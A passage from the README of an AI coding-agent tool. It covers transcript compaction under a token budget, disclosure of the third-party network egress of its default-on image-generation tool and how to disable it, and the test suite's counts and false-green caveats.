  ·   under the 24,000 token budget.
  ·   ⚠️ every token number here is an ESTIMATE — characters divided by 4 …
```

⚠️ **Silent compaction is indistinguishable from amnesia**, which is why it is always
announced: without the line, an agent that stops knowing something it read two rounds ago
looks like a defective model. Every token figure is an *estimate* (chars ÷ 4 — counting
properly would mean a dependency) and the printed line says so.

A conversation already under budget is returned **byte-identical** and costs nothing, so
short sessions are unaffected — measured, an 8-round session in the same workspace never
triggered it once.

This is what made `--max-rounds` safe to raise from a ceiling of 8 to **16**: the
constraint was never the round count, it was a transcript that grew without bound. The
15-round session quoted above **could not have existed** under the old ceiling.

⚠️ **Honest limits.** Compaction only ever clamps *tool results*; it does not summarise, so
on a transcript whose weight is model prose rather than file contents it frees little. The
7.6% above is what one real session happened to yield — the saving depends entirely on what
the model did, and no fixed percentage is promised. `underBudget: false` is a real reported
outcome: it does not pretend to have fitted something it could not.

### ⚠️ `generate_image` is different — it is ON by default, and it leaves your machine

Image generation works with **no configuration at all**, because a capability you have to
discover and configure is one most people never see. That convenience has a cost you are
entitled to know about before you run it, so here it is plainly:

**When the agent generates an image, your prompt is sent to a third-party service over the
internet.** By default that is [Perchance](https://perchance.org), reached directly over HTTP/2 —
your prompt goes to them, not to us, and no XXIautomate server is involved. If they do not answer,
the request falls through to [Pollinations](https://pollinations.ai), which also needs no account.
No file contents, no code and no credentials from your workspace are sent to either.

Two things this section used to leave out, both of which you are entitled to know:

**1. The prompt that leaves is not the prompt you wrote.** Every request is rewritten by an art
director before it is sent (`lib/image-director.mjs`): photographic direction — lens, light,
composition, grade — is appended, and *requests for text are actively removed*, because diffusion
models cannot spell and garbled lettering is the defect a viewer reads instantly as "made by a
machine". Ask for "a coffee bag with the label Ember & Oak" and the service is asked for a
composition that needs no label. This makes the output much better and it means the literal string
you typed is not what was transmitted.

**2. The generated image is uploaded to OpenRouter to be looked at.** After each attempt the PNG
is base64'd into a vision call to `qwen/qwen3.7-flash` on your own `OPENROUTER_API_KEY`
(`critiqueImage`, `lib/image-director.mjs`) which scores it and names its defects. That is a
second egress, to a second party, of a file that is in your workspace. It is what stops the agent
— which cannot see — from confidently referencing a smeared, illegible hero across four pages,
which is a thing that actually happened. **Without an API key the critic is skipped and the result
says so** (`accepted: false`, "NOT reviewed") rather than assuming approval. Up to two attempts,
never three.

⚠️⚠️ **Timing — and this paragraph was WRONG until it was measured.** It previously said the
generation was "about three seconds" and the whole call "closer to ten seconds", and flagged the
tool's own "about a minute per image" as a stale leftover to be corrected.

**Measured end to end, 2026-08-11, one real call** (`generateImage`, 512×512, a funded
`OPENROUTER_API_KEY` present so the critic ran, default route straight to perchance.org):

```
elapsed 54,829 ms  ·  ok: true  ·  a-sharp-high-resolution-photograph-of-a-.jpg
```

**Fifty-five seconds.** The schema's "about a minute per image" is the accurate number and the
README's three-and-ten were the stale ones — the correction had been aimed at the wrong file.
Nothing in the schema was changed as a result. Budget roughly a minute per image, and up to
twice that when the critic rejects the first attempt.

⭐ The reason this is worth writing down rather than quietly editing: the earlier numbers were
inherited from a source that measured *generation only*, and were then presented as the cost of
the whole call. That is how a document ends up recommending a change to the one line in the
package that was already right.

Three ways to control it:

```bash
export PERCHANCE_IMAGE_URL=            # empty = OFF. The tool is never offered.
export PERCHANCE_IMAGE_URL=http://localhost:8080   # point it at your own instance
acuvo --no-run "…"                     # unrelated, but it stops execution entirely
```

Setting it to an **empty string** disables it deliberately and is respected — an unset variable
means "use the default", an empty one means "I have decided not to".

⚠️ **This section previously said the opposite** — that every media tool was gated on its env
var. That was false for `generate_image` and had been for some time. It is documented here rather
than quietly corrected, because undisclosed network egress from a tool you installed is exactly
the kind of thing that should cost a project its credibility.

---

## Tests

```bash
npm test          # node --test test/*.test.mjs — no network, no API key
```

**1,378 tests across 61 files**, measured 2026-08-11: 1,333 pass, 45 skipped, 0 fail.
(This README said 455 for long enough that the real number had tripled underneath it. The
count above is a snapshot, not a constant — run the command and believe the output, not
this line.)

They cover the safety decisions — path escapes, shell refusal, credential scrubbing,
ambiguous edits, commit guards — the places where being wrong is dangerous rather than merely
broken. `test/docs-truth.test.mjs` additionally fails the suite when this README's documented
defaults stop matching the exported constants.

⚠️ **Read the skip count, not just the fail count.** 44 of those 45 skips are
`test/bundle.test.mjs` — 545 lines specifying a `scripts/bundle.mjs` that was never written
(see Install). A suite that is green because a whole file excused itself is the same lie as a
suite that is green because it found no tests, and the second one is named below.

⚠️ **`npm test` is a false green in an installed copy.** `package.json`'s `files` allowlist ships
`bin/`, `lib/` and the docs — not `test/`. Run it from a source checkout, where the tests exist.
In a packed or installed copy the glob matches nothing, `node --test` finds no tests, and the
command exits 0 having verified precisely nothing. A green that means "no tests ran" is the worst
kind, so it is named here rather than left to be discovered.

---

## Licence

MIT. See [LICENSE](./LICENSE).
